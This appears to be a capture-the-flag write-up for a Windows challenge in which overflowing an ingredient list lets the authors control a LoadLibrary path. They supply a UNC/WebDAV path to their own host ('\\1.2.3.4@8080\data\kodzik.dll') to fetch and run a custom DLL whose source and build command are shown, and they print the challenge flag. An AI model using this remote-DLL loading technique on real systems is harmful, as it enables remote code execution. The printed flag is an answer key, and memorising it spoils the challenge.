Even though it's supposed to be a pwn challenge we get no binary to reverse
engineer.

Welcome to the cookery recipe Generator:  
Please give a comma-separated list of ingredients:  
```

The service asks for a list, prints it back and terminates:

```  
< Please give a comma-separated list of ingredients:  
> cement,sand,gravel,water  
< cement,sand,gravel,water  
< Sorry, the kitchen is currently closed  
```

The obvious next step is to try a payload like this one:

```  
< Please give a comma-separated list of ingredients:  
> ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,  
```

And this time we get a nice error message along with a stack trace:

```  
WARNING Unable to load the dll ,,,,,,,,,,,

The warning is especially interesting, because it suggests we can try to make
it load a library with a specified name,  
which we most likely overwrote providing an input of more than 64 characters.

We've tried to load a library that should load on every Windows system (for
example `user32.dll`) and although the app  
still crashes with a stracktrace, the warning about not being able to load the
dll doesn't show up anymore.

Then we remembered a nifty trick when exploiting Windows challenges at CTFs
(especially at onsite events): if we can  
somehow invoke a `LoadLibrary` with our own library hosted on a network share,
we immediately gain code execution that's  
very convenient to use (after all, that's just C code written by us).

Just like before with `user32.dll` we've tried providing a UNC path to a
publicly hosted library:

```  
< Please give a comma-separated list of ingredients:  
>
> ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\live.sysinternals.com\tools\autorunsc.exe  
<
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\live.sysinternals.com\tools\autorunsc.exe  
< CookeryRecipe.exe caused an Access Violation at location 000000005ED5D491 in
module wow64.dll DEP violation at location 0000000000000000.  
```

And again, there is no warning about not being able to load the library and,
what confirms our suspicions that it is  
indeed an invocation of `LoadLibary` with an argument provided by us, a few
seconds delay (most likely to download the  
binary) before the program continued.

We decided it's time to write a library of our own:  
```c  
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)  
{  
   system("dir");  
   ExitProcess(1);  
}  
```

Which then can be cross-compiled to a 32-bit Windows library on Linux with
mingw:  
```  
$ i686-w64-mingw32-g++ kodzik.c -s -shared -o kodzik.dll  
```

Last thing we needed to do was to host a public SMB share and lost an hour
trying to do so. It turns out that many ISPs  
and hosting providers just outright block ports 139 and 445. And rightly so,
because the world had enough problems with  
vulnerabilities in popular SMB implementations (including Wannacry with its
SMB `EternalBlue` exploit). But while looking  
at `tcpdump` output trying to debug SMB connectivity we also saw a connection
attempt to the tcp/80 port. Quick Google  
search revealed that Windows might also try to use WebDAV while resolving UNC
paths and that we can even specify  
a custom port in the path itself: `\\1.2.3.4@8080\path\to\a\file.dll`.  
Knowing that we've set up a WebDAV share using Apache and tried to load our
library with the task service:

```  
< Please give a comma-separated list of ingredients:  
>
> ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\1.2.3.4@8080\data\kodzik.dll  
<

...  
```

Only thing left was to find a file with the flag and print it out:  
`INS{S0M3T1M3S-PWN-DOES-NOT-REQUIRE-REGISTERS}`.

More like a misc than a pwn if you ask us, but...
